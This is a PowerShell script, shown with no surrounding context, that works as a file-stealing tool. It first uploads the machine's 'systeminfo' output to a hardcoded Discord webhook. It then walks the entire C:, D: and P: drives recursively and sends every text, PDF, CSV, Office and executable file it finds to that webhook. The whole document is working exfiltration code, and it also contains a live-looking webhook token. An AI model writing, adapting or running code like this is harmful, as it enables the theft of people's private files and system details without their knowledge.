$DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
$FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")

function Get-MimeType {
    param (
        [string]$FilePath
    )

    switch ([System.IO.Path]::GetExtension($FilePath).ToLower()) {
        ".txt"  { return "text/plain" }
        ".pdf"  { return "application/pdf" }
        ".csv"  { return "text/csv" }
        ".doc"  { return "application/msword" }
        ".docx" { return "application/vnd.openxmlformats-officedocument.wordprocessingml.document" }
        ".xlsx" { return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }
        ".exe"  { return "application/octet-stream" }
        default { return "application/octet-stream" }
    }
}

function Send-FileToDiscord {
    param (
        [string]$FilePath
    )

    try {
        $FileName = Split-Path -Leaf $FilePath
        $ContentType = Get-MimeType -FilePath $FilePath

        # Build multipart form-data for the file upload
        $Body = @{
            file = Get-Content -Path $FilePath -AsByteStream
        }

        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Form $Body
        Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
    } catch {
        Write-Host "Failed to send $FilePath to Discord: $_" -ForegroundColor Red
    }
}

function Send-SystemInfo {
    try {
        $TempFilePath = Join-Path -Path $env:TEMP -ChildPath "systeminfo.txt"
        systeminfo > $TempFilePath
        Send-FileToDiscord -FilePath $TempFilePath
        Remove-Item -Path $TempFilePath -Force
        Write-Host "System info sent to Discord." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to send system info to Discord: $_" -ForegroundColor Red
        return $false
    }
}

function Scan-And-Send-Files {
    param (
        [string[]]$TargetDirectories,
        [string[]]$Extensions
    )

    foreach ($TargetDirectory in $TargetDirectories) {
        Get-ChildItem -Path $TargetDirectory -Recurse -File | Where-Object {
            $Extensions -contains $_.Extension
        } | ForEach-Object {
            Send-FileToDiscord -FilePath $_.FullName
        }
    }
}

function Main {
    # Send system information first to test the connection
    $SystemInfoSent = Send-SystemInfo
    if (-not $SystemInfoSent) {
        Write-Host "Exiting script due to failed connection test." -ForegroundColor Red
        return
    }

    # Hardcode the target directories
    $TargetDirectories = @("C:\", "D:\", "P:\")

    Write-Host "Scanning directories: $TargetDirectories"

    # Send files with matching extensions to Discord
    Scan-And-Send-Files -TargetDirectories $TargetDirectories -Extensions $FileExtensions
}

# Execute the script
Main
